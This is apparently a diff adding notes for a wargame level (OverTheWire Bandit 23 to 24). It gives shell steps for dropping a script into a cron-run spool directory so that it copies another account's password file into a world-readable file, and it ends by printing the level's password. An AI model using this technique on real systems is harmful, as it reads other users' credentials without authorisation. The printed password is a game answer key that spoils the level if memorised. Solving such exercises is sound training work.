@@ -1,0 +1,25 @@
+cd /etc/cron.d
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit24.sh
+
+mkdir /tmp/passwords
+
+create the script /tmp/passwords/myScript.sh with the code below
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/passwords/pass24.txt
+
+touch /tmp/passwords/pass24.txt
+
+chmod 666 /tmp/passwords/pass24.txt
+
+chmod 777 /tmp/myScript.sh
+cp /tmp/passwords/myScript.sh /var/spool/bandit24/foo
+
+wait around 60 seconds
+
+cat /tmp/passwords/pass24.txt
+
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
